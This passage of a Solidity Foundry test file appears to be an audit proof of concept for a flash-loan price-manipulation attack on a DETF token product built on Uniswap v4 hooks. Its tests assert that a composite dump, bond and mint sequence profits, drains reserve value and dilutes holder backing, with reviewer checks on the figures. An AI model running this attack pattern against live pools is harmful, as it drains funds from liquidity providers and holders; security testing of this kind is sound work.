        after_[1] = _backingPerCircDetf();
        for (uint256 i; i < 5; ++i) rs[i] = out[i];
        pv1 = after_[0]; bpd1 = after_[1];
        _summarize();
    }

    function _summarize() internal {
        console2.log("pool pair value after realization", pv1);
        console2.log("backing per 1e9 circulating DETF after", bpd1);
        console2.log("pool pair value lost (bps of pre-attack)", (pv0 - pv1) * 10_000 / pv0);
        console2.log("SUMMARY realized: honest, mintOnly, bondOnly(3rd leg), composite, origBondSpot(pair0 leg)");
        for (uint256 i; i < 5; ++i) console2.logInt(rs[i].realPnl);
        console2.log("SUMMARY atomic in-tx (bond unrealized): same order");
        for (uint256 i; i < 5; ++i) console2.logInt(rs[i].txPnl);
        int256 best = rs[1].realPnl > rs[2].realPnl ? rs[1].realPnl : rs[2].realPnl;
        int256 bestTx = rs[1].txPnl > rs[2].txPnl ? rs[1].txPnl : rs[2].txPnl;
        // rs[4] (original pair0-leg bond-spot) is reported; the stronger pair0-leg composite is test_chain_max2
        console2.log("composite - best single (realized), composite - best single (atomic)");
        console2.logInt(rs[3].realPnl - best);
        console2.logInt(rs[3].txPnl - bestTx);
        assertGt(rs[3].realPnl, best, "composite beats best single primitive");
        assertGt(rs[3].txPnl, bestTx, "composite beats best single primitive atomically");
        assertGt(rs[3].realPnl, 0, "absolute realized profit");
        assertGt(rs[3].txPnl, 0, "atomic in-tx profit before bond is even realized");
        assertLt(rs[0].realPnl, 0, "honest same-capital is unprofitable");
        assertLt(pv1, pv0, "reserve pair value drained");
        assertLt(bpd1, bpd0, "backing per circulating DETF diluted");
    }

    /// @notice Strongest family: dump vs pair0 (doubly inflates g = rD*B/rP0), bond pair0, and mint through the
    /// untouched pair1 leg (pair1 gate stays open, pair1->DETF spot is depressed by the DETF dump).
    function test_chain_max2() public {
        _setupHonest();
        s0 = _spotDetfIn(IERC20(address(pair0)));
        s1 = _spotDetfIn(IERC20(address(pair1)));
        uint256 lend = IERC20(detf).balanceOf(address(lender));
        pv0 = _poolPairValue();
        bpd0 = _backingPerCircDetf();
        console2.log("pool pair value before", pv0, "pair1 reserve", _reserveOf(address(pair1)));
        ChainDetfAttacker.Cfg[6] memory c;
        c[0] = _cfg(lend, 0, 0, 1000 ether); c[0].bondChunks = 2; c[0].dumpLeg0 = true;              // bond-spot single
        c[1] = _cfg(lend, 0, 300 ether, 0); c[1].chunks = 3; c[1].dumpLeg0 = true;                       // spot-mint single (pair0-leg dump)
        c[2] = _cfg(lend, 0, 300 ether, 1000 ether); c[2].bondChunks = 2; c[2].chunks = 3; c[2].dumpLeg0 = true; c[2].bondFirst = true;
        c[3] = _cfg(lend, 0, 0, 2000 ether); c[3].bondChunks = 4; c[3].dumpLeg0 = true;
        c[4] = _cfg(lend, 0, 300 ether, 2000 ether); c[4].bondChunks = 4; c[4].chunks = 3; c[4].dumpLeg0 = true; c[4].bondFirst = true;
        c[5] = _cfg(0, 0, 300 ether, 1000 ether); c[5].bondChunks = 2; c[5].chunks = 3;  // honest same capital
        string[6] memory tags = ["X0 bond-spot single (pair0-leg dump, bond 1000)", "X1 spot-mint single (pair0-leg dump, mint 300)",
            "X2 COMPOSITE (pair0-leg dump, bond 1000 then mint 300)", "X3 bond-spot single bond 2000",
            "X4 COMPOSITE bond 2000 then mint 300", "X5 honest bond 1000 + mint 300 (no flash)"];
        int256[6] memory rp; int256[6] memory tp;
        for (uint256 i; i < 6; ++i) {
            uint256 snap = vm.snapshotState();
            try this.ext_scn2(tags[i], c[i]) returns (int256 a, int256 b) { rp[i] = a; tp[i] = b; }
            catch (bytes memory e) { console2.log("REVERTED", tags[i]); console2.logBytes(e); rp[i] = type(int256).min; }
            vm.revertToState(snap);
        }
        console2.log("SUMMARY2 realized X0..X5 then atomic X0..X5");
        for (uint256 i; i < 6; ++i) console2.logInt(rp[i]);
        for (uint256 i; i < 6; ++i) console2.logInt(tp[i]);
        assertGt(rp[2], rp[0], "composite > bond-spot single (realized)");
        assertGt(rp[2], rp[1], "composite > spot-mint single (realized)");
        assertGt(tp[2], tp[0], "composite > bond-spot single (atomic)");
        assertGt(rp[4], rp[3], "composite > bond-spot single at bond 2000 (realized)");
        assertLt(rp[5], 0, "honest same capital unprofitable");
        // persist the composite end state for victim metrics
        _scn("X2 COMPOSITE (final, persisted)", c[2]);
        console2.log("pool pair value after", _poolPairValue());
        console2.log("pool pair value lost (bps)", (pv0 - _poolPairValue()) * 10_000 / pv0);
        console2.log("backing per 1e9 circ DETF before/after", bpd0, _backingPerCircDetf());
    }

    /// @notice REVIEWER: if the DETF float is the attacker's own (whale, no lender), the held inventory is
    /// marked down by the dilution. Report X2 PnL net of that mark-to-market (marginal spot, pre vs post).
    function test_chain_whaleMTM() public {
        _setupHonest();
        s0 = _spotDetfIn(IERC20(address(pair0)));
        s1 = _spotDetfIn(IERC20(address(pair1)));
        uint256 lend = IERC20(detf).balanceOf(address(lender));
        uint256 bpdB = _backingPerCircDetf();
        ChainDetfAttacker.Cfg memory c = _cfg(lend, 0, 300 ether, 1000 ether);
        c.bondChunks = 2; c.chunks = 3; c.dumpLeg0 = true; c.bondFirst = true;
        R memory r = _scn("X2 whale-MTM", c);
        uint256 s0a = _spotDetfIn(IERC20(address(pair0)));
        uint256 bpdA = _backingPerCircDetf();
        int256 mtmSpot = (int256(s0a) - int256(s0)) * int256(lend) / 1e6;
        int256 mtmBack = (int256(bpdA) - int256(bpdB)) * int256(lend) / 1e9;
        console2.log("REV spot DETF->pair0 per 1e6 wei pre/post-realize", s0, s0a);
        console2.log("REV whale inventory MTM at spot (pair0):"); console2.logInt(mtmSpot);
        console2.log("REV whale inventory MTM at backing (pair0):"); console2.logInt(mtmBack);
        console2.log("REV X2 realized / whale-net(spot) / whale-net(backing):");
        console2.logInt(r.realPnl); console2.logInt(r.realPnl + mtmSpot); console2.logInt(r.realPnl + mtmBack);
        console2.log("REV X2 atomic / whale-net(spot):");
        console2.logInt(r.txPnl); console2.logInt(r.txPnl + mtmSpot);
    }

    /// @notice Smaller DETF inventory: how much of the pair0-leg composite survives.
    function test_chain_inventorySweep() public {
        _setupHonest();
        s0 = _spotDetfIn(IERC20(address(pair0)));
        s1 = _spotDetfIn(IERC20(address(pair1)));
        uint256 lend = IERC20(detf).balanceOf(address(lender));
        uint256 poolD = _reserveOf(detf);
        uint256[4] memory pct = [uint256(5), 10, 25, 50];
        for (uint256 i; i < 4; ++i) {
            uint256 d = poolD * pct[i] / 100;
            if (d > lend) d = lend;
            ChainDetfAttacker.Cfg memory c = _cfg(d, 0, 300 ether, 1000 ether);
            c.bondChunks = 2; c.chunks = 3; c.dumpLeg0 = true; c.bondFirst = true;
            uint256 snap = vm.snapshotState();
            try this.ext_scn2("INV composite", c) returns (int256 a, int256 b) {
                console2.log("INV flash DETF as % of pool DETF reserve", pct[i]);
                console2.log("INV realized / atomic:");
                console2.logInt(a); console2.logInt(b);
            } catch (bytes memory e) { console2.log("INV REVERTED pct", pct[i]); console2.logBytes(e); }
            vm.revertToState(snap);
        }
    }

    function ext_scn2(string memory tag, ChainDetfAttacker.Cfg memory c) external returns (int256, int256) {
        require(msg.sender == address(this));
        R memory r = _scn(tag, c);
        return (r.realPnl, r.txPnl);
    }

    function _reserveOf(address t) internal view returns (uint256 r) {
        uint256[] memory amts = IUniswapV4SeBufferHook(reserveHook).previewExitProportional(IERC20(reserveHook).totalSupply());
        address[] memory toks = IUniswapV4SeBufferHook(reserveHook).tokens();
        for (uint256 i; i < toks.length; ++i) if (toks[i] == t) r = amts[i];
    }
}

/// @notice Same product with the deployed fee_accrual_launch.robinhood.json thresholds (mint 1.05, burn 0.95).
contract ChainDetfSystemDeployedThrTest is ChainDetfSystemTest {
    function _mintThrArg() internal pure override returns (uint256) { return 1.05e18; }
    function _burnThrArg() internal pure override returns (uint256) { return 0.95e18; }
}
